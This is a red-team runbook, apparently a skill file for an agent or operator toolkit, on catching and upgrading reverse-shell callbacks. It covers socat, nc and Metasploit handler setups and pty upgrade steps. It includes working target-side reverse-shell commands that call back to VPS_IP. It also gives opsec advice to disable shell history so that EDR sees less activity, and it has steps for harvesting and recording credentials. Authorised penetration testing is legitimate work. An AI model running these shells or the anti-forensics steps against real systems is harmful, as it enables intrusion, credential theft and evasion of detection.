# Shell Handler: Listeners, TTY Upgrade and Session Hygiene

Turns a raw callback into a usable interactive session: a listener that allocates a pty, a terminal that survives `Ctrl-C` and arrow keys, a transcript on disk, and a clean handover of everything the shell proves into the engagement record. It covers `nc` and `socat` listeners on this host and on `VPS_IP`, the `tmux` layout that keeps sessions alive, the multi/handler equivalent in Metasploit, `LHOST`/`LPORT` selection when this host is behind NAT, and the exact pty upgrade sequence when the shell arrives without job control. Sessions land in `tmux`; transcripts and loot land under `RESULT_DIR`.

## When to use

- A callback has arrived or is about to arrive and the receiving side must not be a bare `nc` in a foreground terminal.
- A session has no prompt, no tab completion, no `Ctrl-C`, or dies on `Ctrl-Z` — the classic missing-pty symptom.
- You need one reproducible listener command that another operator can re-run on the VPS.
- A payload must be fired through Metasploit and its session needs the same handling as a plain shell.
- Not for building the network path — that is `vps-reverse-shell`, `chisel-tunnel`, `suo5-tunnel`, `frp-tunnel` or `ligolo-proxy`. This skill starts at "a TCP connection to my listener is possible".
- Not for persistence design or implant development; a handled session is interactive by nature.

## Prerequisites

- On this host or the VPS: `apt install netcat-traditional socat tmux` (Debian/Ubuntu) or `dnf install nmap-ncat socat tmux`. `rlwrap` is optional and only improves history; `script` is part of `bsdutils`/`util-linux` and is already present almost everywhere. Metasploit is optional: `apt install metasploit-framework` or the installer from Rapid7.
- `netcat-traditional` matters: `nc -e` and `-c` exist only in that variant. OpenBSD `nc` has neither, so a listener that must spawn a program uses `socat` instead.
- A decision on where the listener lives. If this host has no inbound reachability, the listener belongs on `VPS_IP` and the session is reached over SSH.
- Environment with defaults so nothing is mandatory:

```bash
set -a; . "$DSH_HOME/.env" 2>/dev/null; set +a
VPS_IP="${VPS_IP:-}"
LHOST="${LHOST:-${VPS_IP:-127.0.0.1}}"
```

  From Python: `os.environ.get("LHOST", "")`. `LHOST` must be an address the target can actually reach — that is the single most common reason a correctly built payload never connects.
- Every step has a fallback and none is mandatory. No `socat` → `nc` plus a manual pty upgrade. No `tmux` → `nohup` and a transcript file, with the loss that a dropped terminal kills the session. No Metasploit → the plain listener path is identical.

## Workflow

1. Pick the port and check it is free on the receiving host before announcing it anywhere.

```bash
ss -lntp | grep ':LPORT' || echo "LPORT free"
tmux ls 2>/dev/null || echo "no sessions"
```

2. Open the listener inside `tmux` with a pty and a transcript. `socat` with `STDOUT,pty,raw,echo=0` gives job control immediately, which is worth more than any later fix.

```bash
tmux new -s h-LPORT -d
tmux send-keys -t h-LPORT "socat -d -d TCP-LISTEN:LPORT,reuseaddr,fork STDOUT,pty,raw,echo=0 2>&1 | tee RESULT_DIR/handler-LPORT.log" C-m
tmux attach -t h-LPORT
```

3. For the Metasploit path, configure `LHOST` and `LPORT` explicitly and let the handler allocate the pty.

```bash
tmux new -s msf -d
tmux send-keys -t msf "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST LHOST; set LPORT LPORT; set ExitOnSession false; run -j'" C-m
tmux attach -t msf
# later, inside msfconsole
# sessions -l ; sessions -i 1 ; background
```

4. When only `nc` is available, use the variant that exists and wrap it so history and arrows work.

```bash
# netcat-traditional
rlwrap -cA -f RESULT_DIR/nc-history-LPORT.txt nc -lvnp LPORT | tee RESULT_DIR/handler-LPORT.log
# OpenBSD nc
rlwrap -cA nc -l LPORT | tee RESULT_DIR/handler-LPORT.log
```

5. On the target side, connect and immediately ask for a pty. The `-e` form only works with `netcat-traditional`; the `socat` form is the portable one.

```bash
# target connects back with an interactive shell
nc VPS_IP LPORT -e /bin/bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:VPS_IP:LPORT
# or hand the pty to the target's own listener, which the VPS reaches with socat
socat file:$(tty),raw,echo=0 TCP-LISTEN:LPORT,reuseaddr
```

6. Upgrade a shell that arrived without a pty. The sequence matters: background the shell, change the local terminal to raw, foreground it, then fix the size.

```bash
# inside the session
python3 -c 'import pty;pty.spawn("/bin/bash")'
# fallbacks when python is missing
script -qc /bin/bash /dev/null
perl -e 'exec "/bin/bash";'

# then type Ctrl-Z to background the shell, back in the local terminal
stty raw -echo
fg
# inside the session again
reset
export TERM=xterm-256color
export SHELL=/bin/bash
stty rows 40 cols 120
```

   `stty raw -echo` must be run locally after `Ctrl-Z`, not inside the session; running it in the wrong place produces an unresponsive terminal that needs `stty sane` to recover.

7. Take the identity and situation read once, then record it. Do not explore before the identity is written down.

```bash
id; whoami; hostname; uname -a; cat /etc/os-release | head -2
ps -p $$ -o pid,ppid,user,cmd
ip -br addr 2>/dev/null || ifconfig -a
ss -lntp 2>/dev/null | head -20
sudo -n -l 2>/dev/null
```

8. Keep the session usable and logged: one `tmux` window per session, piping to a transcript, so a second operator can attach without disturbing the first.

```bash
tmux pipe-pane -o -t h-LPORT 'cat >> RESULT_DIR/handler-LPORT.log'
tmux list-windows -t h-LPORT
tmux send-keys -t h-LPORT 'export HISTFILE=/dev/null; unset HISTFILE' C-m
```

9. Close out. Kill the listener, keep the transcript, and record what the session proved before the evidence gets cold.

```text
redteam_credential_add  host=TARGET_IP  username=<user>  secret_type=password  secret_value=<value>  secret_ref=RESULT_DIR/cred-TARGET_IP.txt
redteam_attack_file_add target=TARGET_IP  name=reverse-shell-<payload>  kind=script  evidence=<the tmux transcript line showing the connection>
redteam_session_check   engagement=<id>
```

## Output and evidence

- `RESULT_DIR/handler-LPORT.log` — full transcript from listener start to session end, including the connection line and every command typed while `pipe-pane` was active.
- `RESULT_DIR/nc-history-LPORT.txt` — `rlwrap` history, useful to replay a sequence without retyping.
- `RESULT_DIR/session-TARGET_IP.txt` — operator notes: identity output, interfaces, listeners, privilege state, timestamps.
- `RESULT_DIR/cred-TARGET_IP.txt` — harvested secrets, referenced from the record and never pasted into a report body.
- `redteam_credential_add` per usable secret with `host`, `username`, `secret_type`, `secret_value`, `secret_ref`.
- `redteam_attack_file_add` with `kind=script` for a payload that demonstrably produced a session; `evidence` names the transcript and the time.
- `redteam_tunnel_add` only when the shell becomes a structured channel (for example a `socat` listener the VPS reaches); otherwise the session is a credential/asset observation, not a tunnel.
- `redteam_asset_add` with `provenance=active`, `tool=shell-handler`, and `state` reflecting the privilege actually held.
- `redteam_evidence_record` with `operation=shell_session`, `authority=tool-output`, `confidence=observed`, and `limitations` stating that the transcript is a local log the operator produced.

## Failure modes

- `nc: invalid option -- 'e'` → OpenBSD `nc` is installed → install `netcat-traditional` or use `socat exec:'bash -li',pty,...`.
- Session connects and immediately prints `bash: cannot set terminal process group` / `no job control in this shell` → no pty was allocated → restart with `socat ... pty` and run the upgrade sequence.
- Entering `stty raw -echo` leaves the terminal unusable → it was run on the wrong side, or `fg` was skipped → type `stty sane` then `reset` locally and redo the sequence in order.
- `Ctrl-C` kills the whole session instead of interrupting a command → `socat` pushed `sigint` to the parent shell → connect with `socat exec:'bash -li',pty,stderr,setsid,sigint,sane`.
- Payload connects out but nothing appears → `LHOST` is a private address the target cannot route to → use `VPS_IP`, or forward the port on the router, or move the listener to the VPS.
- `bind: Address already in use` → a previous listener or a `tmux` window still owns the port → `ss -lntp | grep LPORT`, `tmux kill-window -t h-LPORT`.
- Two sessions answer the same port and output interleaves → `socat ... fork` with two pty consumers, or two operators on one listener → one listener per session, one `tmux` window per listener.
- `msfconsole` shows the handler running but `sessions -l` stays empty → wrong `PAYLOAD` architecture or `ExitOnSession` and a typo'd `LPORT` → verify with `ss -lntp` on the VPS and re-run the handler with the payload matching `uname -m`.
- Transcript file is empty after a working session → `tee` was attached to the wrong side of the pipeline, or `pipe-pane` was added to the wrong window → write the file from `tmux pipe-pane` and check with `ls -l` while the session is live.
- Shell dies when the SSH hop closes → the listener was started in a plain shell, not `tmux` → always `tmux new -s ... -d`.

## Notes

- Rate: one interactive session is one connection; do not run scans through it. If a tool must run inside the session, keep `THREADS=1` and expect output to be line-buffered.
- Opsec: disable history in the target shell (`unset HISTFILE`, `export HISTFILE=/dev/null`), avoid writing to `/tmp` with predictable names, and keep the number of concurrent sessions to what the task needs — several shells from one host is the loudest pattern an EDR sees.
- Idempotency: `socat` with `reuseaddr` can be restarted against the same port after a crash; `nc` cannot, so check `ss -lntp` before restarting either.
- Resume: `tmux` survives a detached SSH client, so a dropped laptop does not kill the engagement. After a host reboot, the listener is gone and the target must call back again — plan a re-trigger before you need one.
- Cleanup: `tmux kill-session -t h-LPORT`, kill any `socat`/`nc` left behind (`pgrep -af 'socat|nc -l'`), close the port in the security group if it was opened for this, remove payloads and fifos from the target, and mark the tunnel row `status=down` through `redteam_tunnel_update` when one was recorded.
